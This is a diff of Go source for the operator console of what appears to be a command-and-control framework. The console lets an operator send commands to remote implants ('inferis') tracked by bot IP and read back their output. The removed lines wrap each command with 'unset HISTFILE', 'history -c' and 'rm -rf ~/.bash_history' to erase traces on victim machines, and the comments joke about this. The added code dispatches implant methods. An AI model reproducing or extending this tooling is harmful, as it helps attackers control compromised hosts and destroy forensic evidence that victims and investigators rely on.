@@ -2,12 +2,12 @@ package chambers
 
 import (
 	"fmt"
+	"io"
 	"os"
 	"os/signal"
 	"strings"
 	"syscall"
-	"time"
-	"io"
+	"text/tabwriter"
 
 	"github.com/Yyax13/onTop-C2/src/misc"
 	"github.com/Yyax13/onTop-C2/src/types"
@@ -16,60 +16,51 @@ import (
 )
 
 var imperius types.Chamber = types.Chamber{
-	Name:        "imperius",
-	Description: "Interact with a imperius",
-	Parallel:    false,
-	Runes:     imperiusRuness,
-	Execute:     InteractWithSession,
+	Name: 			"imperius",
+	Description: 	"Interact with INFERIs",
+	Parallel: 		false,
+	Runes: 			imperiusRunes,
+	Execute: 		InteractWithSession,
+
 }
 
-var imperiusRuness map[string]*types.Rune = map[string]*types.Rune{
+var imperiusRunes map[string]*types.Rune = map[string]*types.Rune{
 	"INFERI": {
-		Name:        "INFERI",
+		Name: "INFERI",
 		Description: "The target inferi-id to handle interaction",
-		Required:    true,
-		Value:       "",
+		Required: true,
+		Value: "",
+
 	},
+
 }
 
 var interruptChannel chan struct{} = make(chan struct{})
 func InteractWithSession(runes map[string]*types.Rune) {
-	idRunes, ok := runes["INFERI"]
+	idOpt, ok := runes["INFERI"]
+	if !ok || idOpt.Value == "" {
+		misc.PanicWarn("The rune 'INFERI' is unset\n", true)
+		return
+
+	}
+	
+	inferi, ok := Inferis[idOpt.Value]
 	if !ok {
-		misc.PanicWarn(fmt.Sprintf("The option %s is unset\n", "INFERI"), true)
+		misc.PanicWarn(fmt.Sprintf("Not found inferi with id %s\n", idOpt.Value), true)
 		return
 
 	}
 
-	imperiusID:= idRunes.Value
-	if idRunes.Value != "" {
-		misc.PanicWarn(fmt.Sprintf("The %v value isn't valid, must be a valid inferi ID str (inferi-00000)\n", idRunes.Name), true)
+	err := misc.ForceClearStdout()
+	if err != nil {
+		misc.PanicWarn(fmt.Sprintf("An error occurred during stdout forced clear: %v\n", err), true)
 		return
 
 	}
 
-	var imperius *MarauderInferi
-	var exists bool
-
-	imperius, exists = Inferis[imperiusID]
-
-	if !exists {
-		misc.PanicWarn(fmt.Sprintf("Error: %v %s\n", "Not found inferi with id", imperiusID), true)
-		return
-
-	}
-
-	newErr := misc.ForceClearStdout()
-	if newErr != nil {
-		misc.PanicWarn(fmt.Sprintf("An error ocurred during stdout forced clear: %v", newErr), false)
-		return
-
-	}
-
-	botIP, _ := misc.Colors(imperius.BotIP, "green")
-	promptSignal, _ := misc.Colors("⌁", "white_bold")
-	endFromListener := "___END__OF__RESULT__IN__" + imperius.ID + "__" + imperius.BotIP + "___" // Im shy of pushing this on gh, broooo this hack is gorgeous, critical in todo, i need to refactor this function (fr i need 2 refactor all that module but idrc) to handle other types of connection (or win conns)
-	prompt := fmt.Sprintf("%v %v ", botIP, promptSignal)
+	botIp, _ := misc.Colors(inferi.BotIP, "green")
+	promptSignal, _ := misc.Colors("⌁ ", "white_bold")
+	prompt := fmt.Sprintf("%s %s", botIp, promptSignal)
 	signal.Stop(misc.InterruptSigs)
 	signal.Notify(misc.ChanInterruptSigs, syscall.SIGINT)
 
@@ -77,14 +68,19 @@ func InteractWithSession(runes map[string]*types.Rune) {
 	misc.ChanInterruptHandler(interruptChannel)
 	rl, ee := readline.New(prompt)
 	if ee != nil {
-		fmt.Println("Some error occurred during readline initialization: ", ee)
-		os.Exit(0)
+		misc.PanicWarn(fmt.Sprintf("Some error occurred during readline initialization: %v\n", ee), true)
+		return
 
 	}
 
+	writer := tabwriter.NewWriter(os.Stdout, 0, 0, 4, ' ', 0)
+	
+	os.Setenv("disableErrorPrintsFromMarauder", "ye")
+	defer os.Unsetenv("disableErrorPrintsFromMarauder")
+
 	for {
 		select {
-		case <-interruptChannel:
+		case <- interruptChannel:
 			signal.Stop(misc.ChanInterruptSigs)
 			signal.Notify(misc.InterruptSigs, syscall.SIGINT)
 			return
@@ -96,43 +92,74 @@ func InteractWithSession(runes map[string]*types.Rune) {
 
 			}
 
-			userCommand := strings.TrimSpace(l)
-			if userCommand == "" {
+			userCmd := strings.TrimSpace(l)
+			if userCmd == "" {
 				continue
 
 			}
 
-			imperius.Commands <- fmt.Sprintf("unset HISTFILE; %v; echo; echo %v; history -c; rm -rf ~/.bash_history", userCommand, endFromListener) // I don't believe that this shit code is in a real repo, bro literally added unset HISTFILE and other shits hardcoded xd (ps: i developed this shit)
-
-			var fullResponse []string
-			var finishedPrinting bool
-
-			for !finishedPrinting {
-				select {
-				case output := <-imperius.Outputs:
-					trimOutput := strings.TrimSpace(output)
-					if trimOutput == endFromListener {
-						finishedPrinting = true
-						break
-
-					}
-
-					fullResponse = append(fullResponse, trimOutput)
-
-				case <-time.After(25 * time.Second):
-					misc.PanicWarn(fmt.Sprintf("Error: %v\n", "Timeout waiting for response"), false)
-					finishedPrinting = true
+			switch {
+			case strings.HasPrefix(userCmd, "help"):
+				fmt.Print("Avaliable commands/methods:\n")
+				fmt.Fprintf(writer, "\t%s\t%s\t%s\t%s\n", "Name", "Description", "Command", "Usage example")
+				commands := inferi.Spell.Methods
+				commands["help"] = &types.SpellMethod{
+					Name: "Help",
+					Description: "Shows this menu",
+					UsageExample: "help",
+					OperatorSideCommand: "help",
 
 				}
 
+				for _, v := range commands {
+					fmt.Fprintf(writer, "\t%s\t%s\t%s\t%s\n", v.Name, v.Description, v.OperatorSideCommand, v.UsageExample)
+
+				}
+				
+				writer.Flush()
+				fmt.Print('\n')
+				continue
+
+
+			default:
+				var (
+					found bool
+					method types.SpellMethod
+				
+				)
+
+				for _, v := range inferi.Spell.Methods {
+					if strings.HasPrefix(userCmd, v.OperatorSideCommand) {
+						found = true
+						method = *v
+
+					}
+
+				}
+
+				if found {
+					cmd, err := inferi.Spell.InsertCommand(method.ImplantSideCommand, 
+						[]byte(strings.TrimSpace(
+							strings.TrimSuffix(strings.TrimPrefix(userCmd, method.OperatorSideCommand), "\n"),
+							
+					)))
+
+					if err != nil {
+						misc.PanicWarn(fmt.Sprintf("Some error occurred during insertCommand attempt: %v\n\n", err), true)
+						continue
+
+					}
+
+					inferi.In <- cmd
+					out := <-inferi.Out
+					fmt.Println(string(out))
+					break
+
+				}
+
+				misc.PanicWarn("Command not found, run help to view avaliables commands\n", false)
+
 			}
-
-			if len(fullResponse) != 0 {
-				fmt.Println(strings.Join(fullResponse, "\n"))
-
-			}
-
-			fmt.Print("\n")
 
 		}
 
